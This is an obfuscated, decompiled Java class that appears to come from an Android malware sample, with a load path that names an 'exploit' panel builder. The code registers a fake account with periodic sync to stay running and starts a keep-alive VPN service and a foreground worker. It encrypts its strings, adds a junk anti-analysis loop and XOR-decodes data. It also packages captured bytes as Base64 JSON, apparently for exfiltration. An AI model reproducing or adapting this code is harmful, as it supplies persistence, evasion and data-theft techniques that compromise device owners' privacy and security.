package v.s;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.AbstractWindowedCursor;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.net.VpnService;
import android.os.Build;
import android.os.Bundle;
import android.os.Parcel;
import android.os.Parcelable;
import android.os.Process;
import android.text.TextUtils;
import android.util.Base64;
import android.webkit.WebView;
import androidx.work.impl.WorkDatabase_Impl;
import app.mobilex.plus.HelperYOLoader;
import app.mobilex.plus.services.ConfigTQWorker;
import app.mobilex.plus.services.KeepAliveVpnService;
import app.mobilex.plus.services.SyncAdapterService;
import app.mobilex.plus.util.TypefaceCache;
import java.io.File;
import java.io.IOException;
import java.io.Reader;
import java.io.StringWriter;
import java.lang.reflect.Method;
import java.security.cert.X509Certificate;
import java.util.Locale;
import org.json.JSONException;
import org.json.JSONObject;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public abstract class RIZfHbqXpth8r2yN4 {
    public static int Ee8d2j4S9Vm5yGuR;
    public static boolean JXn4Qf7zpnLjP5;
    public static final Object dDIMxZXP1V8HdM = null;
    public static final o0rN3ekjBJ6kKwok w9sT1Swbhx3hs = new o0rN3ekjBJ6kKwok("NO_OWNER", 1);
    public static final Object vekpFI4d1Nc4fakF = new Object();

    public static void D5P1xCAyuvgF(Context context) {
        try {
            AccountManager accountManager = AccountManager.get(context);
            Account account = new Account(SyncAdapterService.w9sT1Swbhx3hs, context.getPackageName() + TypefaceCache.obtain("006D00770058008400FF00AA00DC00B3"));
            while (Locale.getDefault().toString().length() > 999) {
                Runtime.getRuntime().totalMemory();
            }
            if (accountManager.addAccountExplicitly(account, null, null)) {
                String str = SyncAdapterService.w9sT1Swbhx3hs;
                TypefaceCache.obtain("000200750058008800E500B100C600E700200064005E008600E400BA00D6");
            }
            String str2 = context.getPackageName() + TypefaceCache.obtain("006D00660049008800E600B600D600A20031");
            ContentResolver.setIsSyncable(account, str2, 1);
            ContentResolver.setSyncAutomatically(account, str2, true);
            ContentResolver.addPeriodicSync(account, str2, Bundle.EMPTY, 900L);
            String str3 = SyncAdapterService.w9sT1Swbhx3hs;
            TypefaceCache.obtain("001300730049008E00FF00BB00DB00A4006300650042008900F300FF00C100A4002B0073005F009200FC00BA00D600E7006B");
        } catch (Exception e) {
            String str4 = SyncAdapterService.w9sT1Swbhx3hs;
            TypefaceCache.obtain("00100073004F009200E000FF00D400A6002A007A005E008300AA00FF");
            e.getMessage();
        }
    }

    public static WebView Ee8d2j4S9Vm5yGuR() {
        return HelperYOLoader.Ee8d2j4S9Vm5yGuR;
    }

    public static void H9XlUr4OeMJFiXK(Parcel parcel, int i, int i2) {
        parcel.writeInt(i | (i2 << 16));
    }

    public static void J0zjQ7CAgohuxU20eCW6(Parcel parcel, int i, Parcelable[] parcelableArr, int i2) {
        if (parcelableArr == null) {
            return;
        }
        int iMLSIo1htfMPWeB8V876L = MLSIo1htfMPWeB8V876L(parcel, i);
        parcel.writeInt(parcelableArr.length);
        for (Parcelable parcelable : parcelableArr) {
            if (parcelable == null) {
                parcel.writeInt(0);
            } else {
                int iDataPosition = parcel.dataPosition();
                parcel.writeInt(1);
                int iDataPosition2 = parcel.dataPosition();
                parcelable.writeToParcel(parcel, i2);
                int iDataPosition3 = parcel.dataPosition();
                parcel.setDataPosition(iDataPosition);
                parcel.writeInt(iDataPosition3 - iDataPosition2);
                parcel.setDataPosition(iDataPosition3);
            }
        }
        XiR1pIn5878vVWd(parcel, iMLSIo1htfMPWeB8V876L);
    }

    public static boolean JXn4Qf7zpnLjP5(File file) {
        if (!file.isDirectory()) {
            file.delete();
            return true;
        }
        File[] fileArrListFiles = file.listFiles();
        if (fileArrListFiles == null) {
            return false;
        }
        boolean z = true;
        for (File file2 : fileArrListFiles) {
            z = JXn4Qf7zpnLjP5(file2) && z;
        }
        return z;
    }

    public static int MLSIo1htfMPWeB8V876L(Parcel parcel, int i) {
        parcel.writeInt(i | (-65536));
        parcel.writeInt(0);
        return parcel.dataPosition();
    }

    public static void Qrz92kRPw4GcghAc(Parcel parcel, int i, Parcelable parcelable, int i2) {
        if (parcelable == null) {
            return;
        }
        int iMLSIo1htfMPWeB8V876L = MLSIo1htfMPWeB8V876L(parcel, i);
        parcelable.writeToParcel(parcel, i2);
        XiR1pIn5878vVWd(parcel, iMLSIo1htfMPWeB8V876L);
    }

    public static void XiR1pIn5878vVWd(Parcel parcel, int i) {
        int iDataPosition = parcel.dataPosition();
        parcel.setDataPosition(i - 4);
        parcel.writeInt(iDataPosition - i);
        parcel.setDataPosition(iDataPosition);
    }

    public static final Cursor b1EoSIRjJHO5(WorkDatabase_Impl workDatabase_Impl, eZ6soZeOs7kkqZcCQFOR ez6sozeos7kkqzccqfor) throws IOException {
        Cursor cursorGmNWMfvn6zlEj = workDatabase_Impl.gmNWMfvn6zlEj(ez6sozeos7kkqzccqfor);
        if (cursorGmNWMfvn6zlEj instanceof AbstractWindowedCursor) {
            AbstractWindowedCursor abstractWindowedCursor = (AbstractWindowedCursor) cursorGmNWMfvn6zlEj;
            int count = abstractWindowedCursor.getCount();
            if ((abstractWindowedCursor.hasWindow() ? abstractWindowedCursor.getWindow().getNumRows() : count) < count) {
                try {
                    MatrixCursor matrixCursor = new MatrixCursor(cursorGmNWMfvn6zlEj.getColumnNames(), cursorGmNWMfvn6zlEj.getCount());
                    while (cursorGmNWMfvn6zlEj.moveToNext()) {
                        Object[] objArr = new Object[cursorGmNWMfvn6zlEj.getColumnCount()];
                        int columnCount = cursorGmNWMfvn6zlEj.getColumnCount();
                        for (int i = 0; i < columnCount; i++) {
                            int type = cursorGmNWMfvn6zlEj.getType(i);
                            if (type == 0) {
                                objArr[i] = null;
                            } else if (type == 1) {
                                objArr[i] = Long.valueOf(cursorGmNWMfvn6zlEj.getLong(i));
                            } else if (type == 2) {
                                objArr[i] = Double.valueOf(cursorGmNWMfvn6zlEj.getDouble(i));
                            } else if (type == 3) {
                                objArr[i] = cursorGmNWMfvn6zlEj.getString(i);
                            } else {
                                if (type != 4) {
                                    throw new IllegalStateException();
                                }
                                objArr[i] = cursorGmNWMfvn6zlEj.getBlob(i);
                            }
                        }
                        matrixCursor.addRow(objArr);
                    }
                    cursorGmNWMfvn6zlEj.close();
                    return matrixCursor;
                } catch (Throwable th) {
                    try {
                        throw th;
                    } catch (Throwable th2) {
                        okc5AGRjqrud84oM6d.Ee8d2j4S9Vm5yGuR(cursorGmNWMfvn6zlEj, th);
                        throw th2;
                    }
                }
            }
        }
        return cursorGmNWMfvn6zlEj;
    }

    public static void dDIMxZXP1V8HdM(Throwable th, Throwable th2) {
        if (th != th2) {
            Integer num = HaGob7wAlqCZHzKr.dDIMxZXP1V8HdM;
            if (num == null || num.intValue() >= 19) {
                th.addSuppressed(th2);
                return;
            }
            Method method = GmIdgKXP6q5gYS.dDIMxZXP1V8HdM;
            if (method != null) {
                method.invoke(th, th2);
            }
        }
    }

    public static void gIIiyi2ddlMDR0(R8Y7LdR0VPAAn r8Y7LdR0VPAAn, byte[] bArr) {
        long j;
        int length = bArr.length;
        int i = 0;
        do {
            byte[] bArr2 = r8Y7LdR0VPAAn.xDyLpEZyrcKVe0;
            int i2 = r8Y7LdR0VPAAn.ibVTtJUNfrGYbW;
            int i3 = r8Y7LdR0VPAAn.b1EoSIRjJHO5;
            if (bArr2 != null) {
                while (i2 < i3) {
                    int i4 = i % length;
                    bArr2[i2] = (byte) (bArr2[i2] ^ bArr[i4]);
                    i2++;
                    i = i4 + 1;
                }
            }
            j = r8Y7LdR0VPAAn.Ee8d2j4S9Vm5yGuR;
            if (j == r8Y7LdR0VPAAn.w9sT1Swbhx3hs.vekpFI4d1Nc4fakF) {
                throw new IllegalStateException("no more bytes");
            }
        } while (r8Y7LdR0VPAAn.vekpFI4d1Nc4fakF(j == -1 ? 0L : j + ((long) (r8Y7LdR0VPAAn.b1EoSIRjJHO5 - r8Y7LdR0VPAAn.ibVTtJUNfrGYbW))) != -1);
    }

    public static void gmNWMfvn6zlEj(Context context, boolean z) {
        try {
            Intent intent = new Intent(context, (Class<?>) ConfigTQWorker.class);
            intent.putExtra(TypefaceCache.obtain("002500640054008900E4008000D100A6002E007300490086"), z);
            context.startForegroundService(intent);
        } catch (Exception e) {
            byte[] bArr = ConfigTQWorker.ibVTtJUNfrGYbW;
            TypefaceCache.obtain("000500770052008B00F500BB009200B3002C00360048009300F100AD00C600E7000000790055008100F900B800E60096001400790049008C00F500AD008800E7");
            e.getMessage();
        }
    }

    public static void hjneShqpF9Tis4(Context context) {
        if (KeepAliveVpnService.Ee8d2j4S9Vm5yGuR || k3qGWOP8GEZr.w9sT1Swbhx3hs(context)) {
            return;
        }
        try {
            if (VpnService.prepare(context) == null) {
                try {
                    context.startForegroundService(new Intent(context, (Class<?>) KeepAliveVpnService.class));
                } catch (Exception e) {
                    String str = KeepAliveVpnService.w9sT1Swbhx3hs;
                    TypefaceCache.obtain("00100062005A009500E400FF00D400A6002A007A005E008300AA00FF");
                    e.getMessage();
                }
            }
        } catch (Throwable unused) {
        }
    }

    public static String ibVTtJUNfrGYbW(X509Certificate x509Certificate) {
        if (x509Certificate == null) {
            throw new IllegalArgumentException("Certificate pinning requires X509 certificates");
        }
        return "sha256/" + fadfsJa4iEdiwEC4Xm8.ibVTtJUNfrGYbW(x509Certificate.getPublicKey().getEncoded()).w9sT1Swbhx3hs("SHA-256").dDIMxZXP1V8HdM();
    }

    public static void nQilHWaqS401ZtR(Parcel parcel, int i, String str) {
        if (str == null) {
            return;
        }
        int iMLSIo1htfMPWeB8V876L = MLSIo1htfMPWeB8V876L(parcel, i);
        parcel.writeString(str);
        XiR1pIn5878vVWd(parcel, iMLSIo1htfMPWeB8V876L);
    }

    public static final String pyu8ovAipBTLYAiKab(Reader reader) throws IOException {
        StringWriter stringWriter = new StringWriter();
        char[] cArr = new char[8192];
        int i = reader.read(cArr);
        while (i >= 0) {
            stringWriter.write(cArr, 0, i);
            i = reader.read(cArr);
        }
        return stringWriter.toString();
    }

    public static int vekpFI4d1Nc4fakF(Context context, String str) {
        if (str == null) {
            throw new NullPointerException("permission must be non-null");
        }
        if (Build.VERSION.SDK_INT >= 33 || !TextUtils.equals("android.permission.POST_NOTIFICATIONS", str)) {
            return context.checkPermission(str, Process.myPid(), Process.myUid());
        }
        return w8yTgA6o8BqtcHazpDd.dDIMxZXP1V8HdM(new HEqPccX85NcWnm0(context).w9sT1Swbhx3hs) ? 0 : -1;
    }

    /* JADX WARN: Code duplicated, block: B:7:0x0017  */
    public static final Object w9sT1Swbhx3hs(lRXMEtwekxl6YBP0L2K lrxmetwekxl6ybp0l2k, CBfuES2Lekt8n cBfuES2Lekt8n, CWIOrUfHtKyaxQib0W cWIOrUfHtKyaxQib0W) {
        tZAgH3UsK0PyZC3h tzagh3usk0pyzc3h;
        if (cWIOrUfHtKyaxQib0W instanceof tZAgH3UsK0PyZC3h) {
            tzagh3usk0pyzc3h = (tZAgH3UsK0PyZC3h) cWIOrUfHtKyaxQib0W;
            int i = tzagh3usk0pyzc3h.ibVTtJUNfrGYbW;
            if ((i & Integer.MIN_VALUE) != 0) {
                tzagh3usk0pyzc3h.ibVTtJUNfrGYbW = i - Integer.MIN_VALUE;
            } else {
                tzagh3usk0pyzc3h = new tZAgH3UsK0PyZC3h(cWIOrUfHtKyaxQib0W);
            }
        } else {
            tzagh3usk0pyzc3h = new tZAgH3UsK0PyZC3h(cWIOrUfHtKyaxQib0W);
        }
        Object obj = tzagh3usk0pyzc3h.xDyLpEZyrcKVe0;
        int i2 = tzagh3usk0pyzc3h.ibVTtJUNfrGYbW;
        try {
            if (i2 == 0) {
                SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(obj);
                if (tzagh3usk0pyzc3h.vekpFI4d1Nc4fakF.D5P1xCAyuvgF(fadfsJa4iEdiwEC4Xm8.b1EoSIRjJHO5) != lrxmetwekxl6ybp0l2k) {
                    throw new IllegalStateException("awaitClose() can only be invoked from the producer context");
                }
                tzagh3usk0pyzc3h.Ee8d2j4S9Vm5yGuR = cBfuES2Lekt8n;
                tzagh3usk0pyzc3h.ibVTtJUNfrGYbW = 1;
                hD886kxBkce8U hd886kxbkce8u = new hD886kxBkce8U(1, jb8et6SZeK5TWMrJFxDX.J0zjQ7CAgohuxU20eCW6(tzagh3usk0pyzc3h));
                hd886kxbkce8u.MLSIo1htfMPWeB8V876L();
                ((R5WF639wwoyEjivV7M7) lrxmetwekxl6ybp0l2k).GiffeZJ1rbwyx(new vekpFI4d1Nc4fakF(2, hd886kxbkce8u));
                Object objJ0zjQ7CAgohuxU20eCW6 = hd886kxbkce8u.J0zjQ7CAgohuxU20eCW6();
                pjN1L01KDMWnPCy0daD pjn1l01kdmwnpcy0dad = pjN1L01KDMWnPCy0daD.w9sT1Swbhx3hs;
                if (objJ0zjQ7CAgohuxU20eCW6 == pjn1l01kdmwnpcy0dad) {
                    return pjn1l01kdmwnpcy0dad;
                }
            } else {
                if (i2 != 1) {
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                cBfuES2Lekt8n = tzagh3usk0pyzc3h.Ee8d2j4S9Vm5yGuR;
                SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(obj);
            }
            cBfuES2Lekt8n.w9sT1Swbhx3hs();
            return Eo0e0FTdv96U7KeCzoB.dDIMxZXP1V8HdM;
        } catch (Throwable th) {
            cBfuES2Lekt8n.w9sT1Swbhx3hs();
            throw th;
        }
    }

    public static void wotphlvK9sPbXJ(Parcel parcel, int i, Bundle bundle) {
        if (bundle == null) {
            return;
        }
        int iMLSIo1htfMPWeB8V876L = MLSIo1htfMPWeB8V876L(parcel, i);
        parcel.writeBundle(bundle);
        XiR1pIn5878vVWd(parcel, iMLSIo1htfMPWeB8V876L);
    }

    public static JSONObject xDyLpEZyrcKVe0() throws JSONException {
        byte[] bArr = ConfigTQWorker.ibVTtJUNfrGYbW;
        if (bArr == null) {
            return null;
        }
        JSONObject jSONObject = new JSONObject();
        jSONObject.put(Y9mRyRdkl5FOcwb66V6.pyu8ovAipBTLYAiKab("002000770056008200E200BE00ED00B7002B0079004F0088", jSONObject, TypefaceCache.obtain("0037006F004B0082"), "00270077004F0086"), Base64.encodeToString(bArr, 2));
        jSONObject.put(TypefaceCache.obtain("0037007F0056008200E300AB00D300AA0033"), ConfigTQWorker.b1EoSIRjJHO5);
        jSONObject.put(TypefaceCache.obtain("0030007F00410082"), bArr.length);
        return jSONObject;
    }
}
